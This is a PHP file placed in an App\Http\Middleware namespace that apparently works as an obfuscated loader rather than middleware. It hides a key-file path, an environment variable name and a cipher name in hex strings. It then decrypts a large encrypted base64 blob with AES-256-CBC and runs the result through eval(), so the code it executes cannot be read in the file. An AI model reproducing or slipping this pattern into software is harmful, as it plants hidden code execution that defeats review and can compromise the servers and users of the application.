<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('JGKhh4AAITzjE9gAsKuQ7w==');

$c=base64_decode(

'eIfWIG+oUUFcyhuzlrsgQqpsxpQoGFNjLFHfcZRKGHTQ4CclMBOwkZcJ/+eZcnrHXDq/m+qvv2Op' .
'5+Few9IinmiLuUqZONIrurkm2d4GLo3XTGKoCb/Rvp5tIB7nEJndHHEqIvn0HxOydNmSeKekTko+' .
'sVPZAv3vYm3uhucbmd9eeyzkpUoGKKqw2Gh1dMyAXROOPwoIh9URCiPGpRtraTNk1MFhJF4ZQ5Dm' .
'xEiyJVTACpRd7S1S6/+U3Zx4Mt2XWiPKkBIk6/RtXKsb08JqLQfAjGi+M05PTrAREBXBnDp/4+pK' .
'8CysojqfvV1Xr3V+tCdW4CaEgoywuYlF0txM66yC3K17BJj2ouK8QJ67QFqDujlmKZsWUtCVxksw' .
'uakNWjIFHfrXgN8jlOU8h1OcWy0YWfZ6IyAdqHx1zoRDhUeWSkXDKhKtKDKC3/W3qrCAD6mwubEj' .
'm/XB6ZiUHnt+klsu58tExuryCQEHyjwdZoeCvy0cCxpqYGgS7U2p26XC4X5b3o0LCpoq2czpgnll' .
'QcvdKkYRF/HcyJ/0kdoRKuO1kbjdJL6xx9hj0KhnC3f7A2EnE+R8xocB9o3VEplkVKptD163iPoA' .
'dWJ+Fuz1mYw5JLIqHEdwtAWHqYzHemBuKytK2OjaZOMSMGU+BNO31zMT1verF8XP0+1mUgfrQEK2' .
'jnvjgpAys3HHefEROUOem5U2tPV6pm+ORqAMVIthxNVePzmkjtgbctB3ZUnT/XNGjopd2WwZEovm' .
'OSHM7Jaw9dyMDgR6iMjwLIgXEvK88w9mkF5rXabUHVhA5jMJBzseXb25ZKJymoT18JO3G9ArcJ55' .
'HRCkVtvqLLA1rRX6Wrk4dYG6aBqLRjHJmD1asJlhejdPn+huZJnRTx44G9gF6bZGjzmu85ty6Suy' .
'DmWeN5BnIE6vcl2lWW3lcnNbZ8OOmz7WG3FIBSwNthuTRZZKDSiKkZyIyJqTQVSxfigfvLi8RMQi' .
'UtHeP57DWK9O5MQqIAGqlVlPpGuppATXduqnIuP6zwTPNn+DsSb3RDXI9dbq8zehWH/sm5g7DgiK' .
'JTFH1wmn94HoT0nNe/wxr6bO+yF9dJ10dij7kWCWI1m24/YkLNFVXtXAgOUv/TNvp+43q7ddkgyi' .
'jgUS0+8v8sZ85HpKj8tszDLyxu2422J+D4RAlMlP3GBih7AEwr7hj/nT3V3xcgjiJzKZOEQP2BA2' .
'XHX3/vZAj7A5NVRv92uF/+E+dbqFDMGbPue4l9h15/aGgMN6HlHzgJaE4za0DJGOA+NecI9Im+CD' .
'V+R68dcM+wIquid2eKouJyFS5IlvL8B79JbqrTw+Uto/n49BTOyMXkjSCCPhTOU6v87jkiQqIX/H' .
'ox+kRsmerUBd3V2CaX4PoANGLPrYprYQXV1XPy2Xx/h1IcXQBClb19110FcqQfp8tHYu8QJmz1Pm' .
'SQTVBVrHlQZGdTS1LkqDxN5F6WGbfMYgWK2QIUgjYV2MxnqKMeeyoyT7wRtMie6U6XM62COZuKxZ' .
'KPoeMWGJoGEXgjBClyebQEuwbEFl78zRM/5YXw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

